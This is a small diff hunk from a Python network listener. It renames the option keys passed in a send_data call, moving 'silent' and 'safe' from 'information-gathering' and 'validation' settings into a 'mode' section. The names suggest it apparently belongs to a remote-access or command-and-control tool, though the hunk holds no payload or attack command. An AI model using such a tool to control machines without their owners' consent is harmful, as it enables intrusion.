@@ -43,7 +43,7 @@ def listening(host, port, stdout=True):
       break
     
     try:
-      send_data(client, {'message': 'CsBLDS4n5zPYq7JaxDjxWHK4', 'silent': state['options']['information-gathering']['silent']}, (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['validation']['terminal-timeout'], 'safe-timeout': state['settings']['safe-timeout']})
+      send_data(client, {'message': 'CsBLDS4n5zPYq7JaxDjxWHK4', 'silent': state['options']['mode']['silent']}, (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe-timeout': state['settings']['safe-timeout']})
       data = recv_data(client, (state['settings']['encryption'], state['settings']['headersize']))
       data.update({'timer': time.time()})
 
